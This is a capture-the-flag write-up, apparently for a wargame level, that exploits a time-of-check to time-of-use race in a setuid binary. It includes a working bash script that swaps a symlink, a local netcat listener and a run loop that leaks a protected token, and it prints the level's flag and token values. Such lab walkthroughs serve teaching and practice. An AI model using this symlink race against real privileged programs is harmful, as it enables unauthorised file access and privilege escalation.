## FLAG: `s5cAJpM8ev6XHw998pRWG728z`

## We have an executable and a token
> ls -l
```
    total 16
    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

## Testing level10 exec
> ./level10
```
    ./level10 file host
            sends file to host if you have access to it
```
## asking for a `file` and an `host`
> ./level10 token 127.0.0.1
```
    You don't have access to token
```
> echo "Hey" > /tmp/10_test && ./level10 /tmp/10_test 127.0.0.1
```
    Connecting to localhost:6969 .. Unable to connect to host 127.0.0.1
```

> ltrace ./level10 /tmp/10_test 127.0.0.1
```
    __libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
    access("/tmp/test10", 4)                                                                     = 0
    printf("Connecting to %s:6969 .. ", "localhost")                                             = 32
    fflush(0xb7fd1a20Connecting to localhost:6969 .. )                                                                           = 0
    socket(2, 1, 0)                                                                              = 3
    inet_addr("localhost")                                                                       = 0xffffffff
    htons(6969, 1, 0, 0, 0)                                                                      = 14619
    connect(3, 0xbffff71c, 16, 0, 0)                                                             = -1
    printf("Unable to connect to host %s\n", "localhost"Unable to connect to host localhost
    )                                        = 36
    exit(1 <unfinished ...>
    +++ exited (status 1) +++
```
## Nothing really interesting

## We'll use `nm -u` for more information
> nm -u level10
```
    w _Jv_RegisterClasses
    U __errno_location@@GLIBC_2.0
    w __gmon_start__
    U __libc_start_main@@GLIBC_2.0
    U __stack_chk_fail@@GLIBC_2.4
    U access@@GLIBC_2.0
    U connect@@GLIBC_2.0
    U exit@@GLIBC_2.0
    U fflush@@GLIBC_2.0
    U htons@@GLIBC_2.0
    U inet_addr@@GLIBC_2.0
    U open@@GLIBC_2.0
    U printf@@GLIBC_2.0
    U puts@@GLIBC_2.0
    U read@@GLIBC_2.0
    U socket@@GLIBC_2.0
    U strerror@@GLIBC_2.0
    U write@@GLIBC_2.0
```
## The program use `access` and `open`

## What's in `access` man ?
> man access
```
    Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a secu‐
    rity hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this  reason,
    the  use  of  this  system  call  should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the
    process's effective user ID to the real ID and then call open(2).)
```
## This is exactly the case for this program
## And this is called a Time-of-check to time-of-use bug (TOCTOU)

------------------------------------------------

## We create a script which create a file switching its symbolic link with `token` and an accessible one
> vi /tmp/10_toctou.sh
```
#!/bin/bash

echo " ( Test 10 ) " > /tmp/10_linked

while true
do
        ln -sf /tmp/10_linked /tmp/10_symlink
        ln -sf /home/user/level10/token /tmp/10_symlink
done
```
## Make it executable
> chmod +x /tmp/10_toctou.sh
## And launch it in background
> /tmp/10_toctou.sh &
## We listen to port 6969
> nc -lk 6969 | grep -v ".*( )*." &
## And execute the executabel in loop with the created symbolic link file
> while true; do ./level10 /tmp/10_symlink 127.0.0.1; done &>/dev/null
```
    woupa2yuojeeaaed06riuj63c
```

------------------------------------------------

## Kill processes because we're CLEAN
> ps 
> kill PID

------------------------------------------------

> su flag10
> getflag
```
    feulo4b72j7edeahuete3no7c
```
